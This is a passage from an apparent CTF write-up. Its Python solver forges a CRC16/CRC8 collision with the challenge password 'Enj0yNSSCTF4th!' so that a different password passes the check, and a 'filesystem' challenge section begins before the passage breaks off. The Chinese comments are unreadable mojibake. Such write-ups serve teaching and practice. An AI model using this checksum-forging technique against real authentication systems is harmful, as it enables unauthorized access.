</span></span><span class="line"><span class="cl">    <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF3</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== æ„å»º CRC8 åæŸ¥è¡¨ ====================</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç”¨äºåå‘è®¡ç®—æœ€åä¸€ä¸ªå­—èŠ‚ä»¥åŒ¹é…ç›®æ ‡ CRC8</span>
</span></span><span class="line"><span class="cl"><span class="n">table_inv</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">crc8_table</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">table_inv</span><span class="p">[</span><span class="n">val</span><span class="p">]</span> <span class="o">=</span> <span class="n">idx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== CRC16 è®¡ç®—å‡½æ•°ï¼ˆModbusé£æ ¼ï¼‰====================</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_crc16</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ¨¡æ‹Ÿ PHP ä¸­çš„ CRC16(Modbus) ç®—æ³•
</span></span></span><span class="line"><span class="cl"><span class="s2">    åˆå§‹å€¼: 0xFFFF, å¤šé¡¹å¼: 0xA001 (åå‘)
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">chk</span> <span class="o">=</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chk</span> <span class="o">^=</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">chk</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">chk</span> <span class="o">=</span> <span class="p">(</span><span class="n">chk</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">chk</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">chk</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>  <span class="c1"># ä¿æŒåœ¨ 16 ä½å†…</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">chk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== CRC8 è®¡ç®—å‡½æ•° ====================</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calculate_crc8</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    æ¨¡æ‹Ÿ PHP ä¸­çš„ CRC8 æŸ¥è¡¨ç®—æ³•
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">crc</span> <span class="o">=</span> <span class="n">crc8_table</span><span class="p">[(</span><span class="n">crc</span> <span class="o">^</span> <span class="n">b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">crc</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== ä¸»é€»è¾‘å¼€å§‹ ====================</span>
</span></span><span class="line"><span class="cl"><span class="n">ORIGINAL_PASS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Enj0yNSSCTF4th!&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PREFIX_LEN</span> <span class="o">=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl"><span class="n">TARGET_PASS_LEN</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ORIGINAL_PASS</span><span class="p">)</span>  <span class="c1"># å¿…é¡»ä¸º15</span>
</span></span><span class="line"><span class="cl"><span class="n">prefix</span> <span class="o">=</span> <span class="n">ORIGINAL_PASS</span><span class="p">[:</span><span class="n">PREFIX_LEN</span><span class="p">]</span>   <span class="c1"># å›ºå®šå‰12ä½: &#34;Enj0yNSSCTF4&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- æ­¥éª¤1ï¼šè®¡ç®—åŸå§‹å¯†ç çš„ CRC å€¼ ---</span>
</span></span><span class="line"><span class="cl"><span class="n">target_crc16</span> <span class="o">=</span> <span class="n">compute_crc16</span><span class="p">(</span><span class="n">ORIGINAL_PASS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">target_crc8</span> <span class="o">=</span> <span class="n">calculate_crc8</span><span class="p">(</span><span class="n">ORIGINAL_PASS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] åŸå§‹å¯†ç : </span><span class="si">{</span><span class="n">ORIGINAL_PASS</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] ç›®æ ‡ CRC16: </span><span class="si">{</span><span class="n">target_crc16</span><span class="si">:</span><span class="s2">#06x</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">target_crc16</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] ç›®æ ‡ CRC8:  </span><span class="si">{</span><span class="n">target_crc8</span><span class="si">:</span><span class="s2">#04x</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="n">target_crc8</span><span class="si">}</span><span class="s2">)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- æ­¥éª¤2ï¼šæ¨¡æ‹Ÿå¤„ç† prefix åçš„çŠ¶æ€ ---</span>
</span></span><span class="line"><span class="cl"><span class="n">state16</span> <span class="o">=</span> <span class="mh">0xFFFF</span>  <span class="c1"># CRC16 åˆå§‹çŠ¶æ€</span>
</span></span><span class="line"><span class="cl"><span class="n">state8</span> <span class="o">=</span> <span class="mi">0</span>        <span class="c1"># CRC8 åˆå§‹çŠ¶æ€</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">prefix</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">state16</span> <span class="o">^=</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">state16</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">state16</span> <span class="o">=</span> <span class="p">(</span><span class="n">state16</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">state16</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">state16</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">state8</span> <span class="o">=</span> <span class="n">crc8_table</span><span class="p">[(</span><span class="n">state8</span> <span class="o">^</span> <span class="n">b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[i] å‰ç¼€ &#39;</span><span class="si">{</span><span class="n">prefix</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#39; å¤„ç†å:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    CRC16 çŠ¶æ€: </span><span class="si">{</span><span class="n">state16</span><span class="si">:</span><span class="s2">#06x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    CRC8 çŠ¶æ€:  </span><span class="si">{</span><span class="n">state8</span><span class="si">:</span><span class="s2">#04x</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- æ­¥éª¤3ï¼šç©·ä¸¾ç¬¬13ã€14å­—èŠ‚ï¼Œå¹¶åæ¨ç¬¬15å­—èŠ‚ä½¿ CRC8 åŒ¹é… ---</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] å¼€å§‹æœç´¢æ»¡è¶³æ¡ä»¶çš„åç¼€ (b13, b14, b15)...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¯æ‰“å° ASCII å­—ç¬¦é›† (é¿å…ç‰¹æ®Šå­—ç¬¦å¯¼è‡´ä¼ è¾“é—®é¢˜)</span>
</span></span><span class="line"><span class="cl"><span class="n">PRINTABLE</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">))</span>  <span class="c1"># ç©ºæ ¼åˆ° ~</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solution</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">b13</span> <span class="ow">in</span> <span class="n">PRINTABLE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># === æ›´æ–° CRC16 çŠ¶æ€ ===</span>
</span></span><span class="line"><span class="cl">    <span class="n">s16_1</span> <span class="o">=</span> <span class="n">state16</span> <span class="o">^</span> <span class="n">b13</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">s16_1</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">s16_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">s16_1</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">s16_1</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">s16_1</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># === æ›´æ–° CRC8 çŠ¶æ€ ===</span>
</span></span><span class="line"><span class="cl">    <span class="n">s8_1</span> <span class="o">=</span> <span class="n">crc8_table</span><span class="p">[(</span><span class="n">state8</span> <span class="o">^</span> <span class="n">b13</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">b14</span> <span class="ow">in</span> <span class="n">PRINTABLE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s16_2</span> <span class="o">=</span> <span class="n">s16_1</span> <span class="o">^</span> <span class="n">b14</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">s16_2</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">s16_2</span> <span class="o">=</span> <span class="p">(</span><span class="n">s16_2</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">s16_2</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">s16_2</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">s8_2</span> <span class="o">=</span> <span class="n">crc8_table</span><span class="p">[(</span><span class="n">s8_1</span> <span class="o">^</span> <span class="n">b14</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># === åå‘è®¡ç®— b15 ä½¿å¾—æœ€ç»ˆ CRC8 åŒ¹é… ===</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">table_inv</span><span class="p">[</span><span class="n">target_crc8</span><span class="p">]</span>  <span class="c1"># æ‰¾åˆ°è¡¨ä¸­è¾“å‡º=target_crc8 çš„ç´¢å¼•</span>
</span></span><span class="line"><span class="cl">        <span class="n">b15</span> <span class="o">=</span> <span class="p">(</span><span class="n">s8_2</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>     <span class="c1"># å› ä¸º crc8_next = table[s ^ b] =&gt; b = s ^ k</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b15</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">PRINTABLE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>  <span class="c1"># å¿…é¡»æ˜¯å¯æ‰“å°å­—ç¬¦</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># === æ£€æŸ¥ CRC16 æ˜¯å¦ä¹ŸåŒ¹é… ===</span>
</span></span><span class="line"><span class="cl">        <span class="n">s16_3</span> <span class="o">=</span> <span class="n">s16_2</span> <span class="o">^</span> <span class="n">b15</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">s16_3</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">s16_3</span> <span class="o">=</span> <span class="p">(</span><span class="n">s16_3</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xA001</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">s16_3</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">s16_3</span> <span class="o">&amp;=</span> <span class="mh">0xFFFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">tail</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b13</span><span class="p">,</span> <span class="n">b14</span><span class="p">,</span> <span class="n">b15</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">full_pass</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">tail</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">s16_3</span> <span class="o">==</span> <span class="n">target_crc16</span> <span class="ow">and</span> <span class="n">full_pass</span> <span class="o">!=</span> <span class="n">ORIGINAL_PASS</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">solution</span> <span class="o">=</span> <span class="n">full_pass</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;latin1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">solution</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- ç»“æœè¾“å‡º ---</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">solution</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">âœ… æ‰¾åˆ°æœ‰æ•ˆ payloadï¼&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;åŸå¯†ç : </span><span class="si">{</span><span class="n">ORIGINAL_PASS</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;æ–°å¯†ç : </span><span class="si">{</span><span class="n">solution</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;é•¿åº¦ä¸€è‡´: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">solution</span><span class="p">)</span> <span class="o">==</span> <span class="n">TARGET_PASS_LEN</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;CRC16 åŒ¹é…: </span><span class="si">{</span><span class="n">compute_crc16</span><span class="p">(</span><span class="n">solution</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">==</span> <span class="n">target_crc16</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;CRC8 åŒ¹é…:  </span><span class="si">{</span><span class="n">calculate_crc8</span><span class="p">(</span><span class="n">solution</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">==</span> <span class="n">target_crc8</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å†…å®¹ä¸åŒ:  </span><span class="si">{</span><span class="n">solution</span> <span class="o">!=</span> <span class="n">ORIGINAL_PASS</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è‡ªåŠ¨éªŒè¯</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">ğŸ” æœ¬åœ°éªŒè¯ç»“æœ:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  CRC16(&#39;</span><span class="si">{</span><span class="n">solution</span><span class="si">}</span><span class="s2">&#39;) = </span><span class="si">{</span><span class="n">compute_crc16</span><span class="p">(</span><span class="n">solution</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="si">:</span><span class="s2">#06x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;  CRC8 (&#39;</span><span class="si">{</span><span class="n">solution</span><span class="si">}</span><span class="s2">&#39;) = </span><span class="si">{</span><span class="n">calculate_crc8</span><span class="p">(</span><span class="n">solution</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="si">:</span><span class="s2">#04x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜çš„æ”¶è·å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¥½ai</p>
<h2 id="filesystem">filesystem
</h2><p>ä¸‹è½½é™„ä»¶ï¼Œè¿™æ˜¯ä¸»è¦æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
